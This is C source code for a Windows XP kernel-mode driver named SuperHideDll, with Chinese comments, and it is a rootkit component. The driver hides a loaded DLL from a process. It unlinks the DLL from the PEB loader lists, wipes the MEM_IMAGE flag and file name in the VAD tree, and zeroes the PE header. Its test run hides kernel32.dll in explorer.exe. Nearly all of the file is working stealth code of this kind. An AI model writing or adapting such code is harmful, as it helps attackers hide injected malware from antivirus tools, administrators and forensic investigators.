#include "SuperHideDll.h"
#include <ntimage.h>

#define  MEM_IMAGE 0x01000000

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	);

NTSTATUS
SuperhidedllDispatchCreate(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
SuperhidedllDispatchClose(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
SuperhidedllDispatchDeviceControl(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

VOID
SuperhidedllUnload(
	IN PDRIVER_OBJECT		DriverObject
	);
typedef BOOLEAN (*PARSE_VADTREE_ROUTINE)(
	IN PMMVAD VadNode,
	IN PVOID Context
	);

VOID ShowDllFromPEB(PEPROCESS Process,char *szDllName);
VOID ParseVadTree(PMMVAD VadNode);
VOID MyParseVadTreeRoutine(PMMVAD VadNode);
VOID ShowDllFromVAD(PEPROCESS Process,ULONG DllBase);
VOID ZeroPEHeader(ULONG ImageBase);
VOID HideDllFromProcess(PEPROCESS Process,char *szDllName);
BOOL HideDllFromProcessPEB(PEPROCESS Process,ULONG DllBase);
VOID HideDllFromProcessVAD(PEPROCESS Process,ULONG DllBase);
PEPROCESS GetProcessByName(char *szImageName);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, SuperhidedllDispatchCreate)
#pragma alloc_text(PAGE, SuperhidedllDispatchClose)
#pragma alloc_text(PAGE, SuperhidedllDispatchDeviceControl)
#pragma alloc_text(PAGE, SuperhidedllUnload)
#endif // ALLOC_PRAGMA

ULONG EPROCESS_PEB_OFFSET=0x1b0;
ULONG EPROCESS_VADROOT_OFFSET=0x11c;
ULONG EPROCESS_IMAGENAME_OFFSET=0x174;
ULONG EPROCESS_ACTIVEPROCESSLINK_OFFSET=0x88;
ULONG g_DllBase=0;//待隐藏的DLL的基址

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	)
{
		PEPROCESS Process; 
		DWORD BuildNum;//系统版本

		//
		// Create dispatch points for device control, create, close.
		//
    DriverObject->MajorFunction[IRP_MJ_CREATE]         = SuperhidedllDispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = SuperhidedllDispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SuperhidedllDispatchDeviceControl;
    DriverObject->DriverUnload                         = SuperhidedllUnload;
	
		PsGetVersion(NULL,NULL,&BuildNum,NULL);
		if (BuildNum!=2600)
		{
				DbgPrint("Sorry,This driver only supported on Windows XP!\n");
				return STATUS_SUCCESS;
		}

		Process=GetProcessByName("explorer.exe");
		if (Process)
		{
				//
				//简单测试,隐藏Explorer.exe中的kernel32.dll
				//
				HideDllFromProcess(Process,"kernel32.dll");
		}
		else{
				DbgPrint("Could not found target process.\n");
		}

    return STATUS_SUCCESS;
}

NTSTATUS
SuperhidedllDispatchCreate(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

	dprintf("[SuperHideDll] IRP_MJ_CREATE\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS
SuperhidedllDispatchClose(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

	dprintf("[SuperHideDll] IRP_MJ_CLOSE\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS
SuperhidedllDispatchDeviceControl(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	)
{
	NTSTATUS status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	dprintf("[SuperHideDll] IRP_MJ_DEVICE_CONTROL\n");

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

VOID
SuperhidedllUnload(
	IN PDRIVER_OBJECT		DriverObject
	)
{
    DbgPrint("[SuperHideDll] Unloaded\n");
}

//先从PEB中获取待隐藏的DLL的基址
ULONG GetDllBaseFromProcessPEB(PEPROCESS Process,char *szDllName)
{
	ULONG Peb;
	PPEB_LDR_DATA pLdrData;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
	PLIST_ENTRY pListHead,pListNext;
	ANSI_STRING ansiDllName;
	ULONG DllBase=0;
	Peb=*(ULONG*)((char*)Process+EPROCESS_PEB_OFFSET);
	dprintf("PEB=0x%08X\n",Peb);
	__try
	{
		pLdrData=(PPEB_LDR_DATA)*(ULONG*)((char*)Peb+0xC);
		pListHead=&(pLdrData->InLoadOrderModuleList);
		pListNext=pListHead->Flink;
		for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
		{
			pLdrDataEntry=(PLDR_DATA_TABLE_ENTRY)pListNext;
			if (pLdrDataEntry->BaseDllName.Buffer)
			{
				RtlUnicodeStringToAnsiString(&ansiDllName,& (pLdrDataEntry->BaseDllName),TRUE);
				//dprintf("Base=0x%08X %s\n",pLdrDataEntry->DllBase,ansiDllName.Buffer);
				if (!_stricmp(szDllName,ansiDllName.Buffer))
				{
					DllBase=(ULONG)pLdrDataEntry->DllBase;
				}
				RtlFreeAnsiString(&ansiDllName);
				//若找到就退出循环
				if (DllBase) break;
			}//end of if
			
		}
		return DllBase;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("Error occured while searching module in PEB.\n");
		return 0;
	}
}

BOOL HideDllFromProcessPEB(
	PEPROCESS Process,
	ULONG DllBase
	)
{
		ULONG Peb;
		PPEB_LDR_DATA pLdrData;
		PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
		PLIST_ENTRY pListHead,pListNext;
		BOOL bHideOK=0;

		Peb=*(ULONG*)((char*)Process+EPROCESS_PEB_OFFSET);
		dprintf("PEB=0x%08X\n",Peb);

		__try
		{
			pLdrData=(PPEB_LDR_DATA)*(ULONG*)((char*)Peb+0xC);
			pListHead=&(pLdrData->InLoadOrderModuleList);
			pListNext=pListHead->Flink;
			for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
			{
				pLdrDataEntry=(PLDR_DATA_TABLE_ENTRY)pListNext;
				if (DllBase==(ULONG)pLdrDataEntry->DllBase)
				{
					RemoveEntryList(&(pLdrDataEntry->InLoadOrderLinks));
					RemoveEntryList(&(pLdrDataEntry->InMemoryOrderLinks));
					RemoveEntryList(&(pLdrDataEntry->InInitializationOrderLinks));
					bHideOK=TRUE;
					break;
				}
			}
			return bHideOK;
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			return FALSE;
		}
}


VOID HideDllFromProcessVAD(
	PEPROCESS Process,
	ULONG DllBase
	)
{
		PMMVAD VadRoot;
		VadRoot=(PMMVAD)*(ULONG*)((char*)Process+EPROCESS_VADROOT_OFFSET);
		ParseVadTree(VadRoot);
}

//前序遍历
VOID ParseVadTree(
	PMMVAD VadNode
	)
{
		if (VadNode!=NULL)
		{
			ParseVadTree(VadNode->LeftChild);
			MyParseVadTreeRoutine(VadNode);
			ParseVadTree(VadNode->RightChild);
		}	
}

VOID MyParseVadTreeRoutine(
	PMMVAD VadNode
	)
{
		PCONTROL_AREA pControlArea=NULL;
		PFILE_OBJECT FileObject=NULL;

		if (g_DllBase == (VadNode->StartingVpn)<<12 )
		{
			//
			//去掉MEM_IMAGE标志，未测试效果
			//
			VadNode->LongFlags &= ~MEM_IMAGE;
			
			//
			//查找FILE_OBJECT
			//
			pControlArea=VadNode->ControlArea;
			if (pControlArea)
			{
				FileObject=pControlArea->FilePointer;
				if (FileObject && FileObject->FileName.Buffer)
				{
					dprintf("Found FileObject=0x%08X\n",FileObject);
					RtlZeroMemory(FileObject->FileName.Buffer,2);
				}
			}
		}
}

VOID HideDllFromProcess(
		PEPROCESS Process,
		char *szDllName
		)
{
		//
		//先从PEB中找到目标DLL，获取其基址
		//
		KeAttachProcess(Process);
		g_DllBase = GetDllBaseFromProcessPEB(Process,szDllName);
		KeDetachProcess();
		if (!g_DllBase)
		{
				return;
		}
	
		dprintf("Get Base of %s Successfully,Base=0x%08X\n",szDllName,g_DllBase);

		//
		//从VADTree->ControlArea->FilePointer->Buffer中抹掉
		//
		HideDllFromProcessVAD(Process,g_DllBase);

		//
		//先将其从PEB->Ldr链中摘除
		//
		KeAttachProcess(Process);
		HideDllFromProcessPEB(Process,g_DllBase);

		//
		//抹掉PE头
		//
		ZeroPEHeader(g_DllBase);
		KeDetachProcess();
}

VOID ZeroPEHeader(
	ULONG ImageBase
	)
{
		PIMAGE_DOS_HEADER pDosHeader;
		char *pNtHeader;
		PIMAGE_OPTIONAL_HEADER pOptinalHeader;
		ULONG HeaderSize=0;
		PMDL pHeaderMdl;
		PVOID NewBuffer;
		__try
		{
			pDosHeader=(PIMAGE_DOS_HEADER)ImageBase;
			pNtHeader=(char*)ImageBase+pDosHeader->e_lfanew;
			pOptinalHeader=(PIMAGE_OPTIONAL_HEADER)(pNtHeader+4+sizeof(IMAGE_FILE_HEADER));
			HeaderSize=pOptinalHeader->SizeOfHeaders;
			dprintf("Image Header Size=0x%X\n",HeaderSize);
			pHeaderMdl=IoAllocateMdl((PVOID)ImageBase,HeaderSize,FALSE,FALSE,NULL);
			dprintf("pHeaderMdl=0x%08X\n",pHeaderMdl);
			NewBuffer=MmGetSystemAddressForMdl(pHeaderMdl);
			dprintf("NewBuffer=0x%08X\n",NewBuffer);
			RtlZeroMemory(NewBuffer,HeaderSize);
			MmUnmapLockedPages(NewBuffer,pHeaderMdl);
			IoFreeMdl(pHeaderMdl);
	
			//若要针对所有进程，可使用以下方法，此时COW将会失效
			/*
			WPOFF();
			RtlZeroMemory((char*)ImageBase,HeaderSize);
			WPON();
			*/
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			DbgPrint("Error occured while zero pe header.\n");
			return ;
		}
}

PEPROCESS GetProcessByName(
	char *szImageName
	)
{
		PLIST_ENTRY pListHead,pListNext;
		PEPROCESS Process=NULL,ProcessResult=NULL;
		Process=PsGetCurrentProcess();

		pListHead=(PLIST_ENTRY)((char*)Process+EPROCESS_ACTIVEPROCESSLINK_OFFSET);
		pListNext=pListHead->Flink;
		for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
		{
			Process=(PEPROCESS)((char*)pListNext-EPROCESS_ACTIVEPROCESSLINK_OFFSET);
			if (!_strnicmp((char*)Process+EPROCESS_IMAGENAME_OFFSET,szImageName,strlen(szImageName)))
			{
				dprintf("Found %s EPROCESS=0x%08X\n",szImageName,Process);
				ProcessResult=Process;
				break;
			}
		}
		return ProcessResult;
}